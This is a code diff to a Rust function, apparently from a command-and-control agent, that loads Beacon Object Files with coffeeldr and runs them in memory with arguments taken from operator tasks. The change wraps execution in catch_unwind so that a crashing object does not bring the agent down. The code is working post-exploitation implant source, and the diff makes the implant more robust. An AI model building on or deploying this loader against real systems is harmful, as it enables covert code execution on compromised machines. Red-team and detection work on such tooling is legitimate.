@@ -49,50 +49,69 @@ pub fn executeBOF(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
     }
 
 
-    // 3. Load & run COFF from buffer
+    // 3. Load & run COFF from buffer, wrapped in catch_unwind so a panic
+    //    from the loaded BOF doesn't unwind through and kill the agent.
     use coffeeldr::BeaconPack;
 
-    let mut output = String::new();
-    let params_str = params.parameters.trim();
+    let params_str = params.parameters.trim().to_string();
 
-    match CoffeeLdr::new(file_bytes.as_slice()) {
-        Ok(mut ldr) => {
-            output.push_str("COFF loaded!\n");
+    let result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
+        let mut output = String::new();
 
-            if params_str.is_empty() {
-                match ldr.run("go", None, None) {
-                    Ok(res) => output.push_str(&res),
-                    Err(e) => output.push_str(&format!("Run error: {:?}\n", e)),
-                }
-            } else {
-                let mut pack = BeaconPack::default();
+        match CoffeeLdr::new(file_bytes.as_slice()) {
+            Ok(mut ldr) => {
+                output.push_str("COFF loaded!\n");
 
-                for arg in params_str.split_whitespace() {
-                    if let Err(e) = pack.addstr(arg) {
-                        output.push_str(&format!("Arg error ({}): {}\n", arg, e));
+                if params_str.is_empty() {
+                    match ldr.run("go", None, None) {
+                        Ok(res) => output.push_str(&res),
+                        Err(e) => output.push_str(&format!("Run error: {:?}\n", e)),
                     }
-                }
+                } else {
+                    let mut pack = BeaconPack::default();
 
-                match pack.get_buffer_hex() {
-                    Ok(buf) => {
-                        let ptr = buf.as_ptr() as *mut u8;
-                        let len = buf.len();
-
-                        match ldr.run("go", Some(ptr), Some(len)) {
-                            Ok(res) => output.push_str(&res),
-                            Err(e) => output.push_str(&format!("Run error: {:?}\n", e)),
+                    for arg in params_str.split_whitespace() {
+                        if let Err(e) = pack.addstr(arg) {
+                            output.push_str(&format!("Arg error ({}): {}\n", arg, e));
                         }
-
-                        std::mem::forget(buf); // ensure memory lives during run
                     }
-                    Err(e) => {
-                        output.push_str(&format!("Pack error: {}\n", e));
+
+                    match pack.get_buffer_hex() {
+                        Ok(buf) => {
+                            let ptr = buf.as_ptr() as *mut u8;
+                            let len = buf.len();
+
+                            match ldr.run("go", Some(ptr), Some(len)) {
+                                Ok(res) => output.push_str(&res),
+                                Err(e) => output.push_str(&format!("Run error: {:?}\n", e)),
+                            }
+
+                            std::mem::forget(buf); // ensure memory lives during run
+                        }
+                        Err(e) => {
+                            output.push_str(&format!("Pack error: {}\n", e));
+                        }
                     }
                 }
             }
+            Err(e) => output.push_str(&format!("Load error: {:?}\n", e)),
         }
-        Err(e) => output.push_str(&format!("Load error: {:?}\n", e)),
-    }
+
+        output
+    }));
+
+    let output = match result {
+        Ok(out) => out,
+        Err(panic_info) => {
+            if let Some(s) = panic_info.downcast_ref::<&str>() {
+                format!("BOF execution panicked: {}", s)
+            } else if let Some(s) = panic_info.downcast_ref::<String>() {
+                format!("BOF execution panicked: {}", s)
+            } else {
+                "BOF execution panicked (unknown cause)".to_string()
+            }
+        }
+    };
 
 
 
